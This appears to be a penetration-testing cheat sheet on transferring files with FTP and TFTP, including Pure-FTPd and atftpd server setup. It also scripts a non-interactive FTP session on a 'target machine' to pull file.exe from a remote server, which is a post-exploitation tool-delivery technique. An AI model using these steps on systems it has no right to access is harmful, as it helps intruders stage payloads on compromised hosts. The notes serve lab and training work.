# File Transfers with FTP


Serve files:
- FTP: `python -m pyftpdlib [-p port]` Default port pyftpdlib uses is port 2121



Download:
On target machine, if the shell isn't interactive, create a file with all the FTP commands.

```
echo open ip-addr > ftp.txt
echo username >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
```

Then run `ftp -v -n -s:ftp.txt`




### TFTP
Serve:
```
atftpd --daemon --port 69 root-dir
```
(Uses UDP)


To download/upload a file, use `tftp -i ip-addr {GET | PUT} file`











## Pure-FTPd
-> Install and Configure
```
sudo apt update && sudo apt install pure-ftpd
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```








## tftp
-> Install and Configure
```
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

-> Transfer
```
tftp -i <IP> get file
```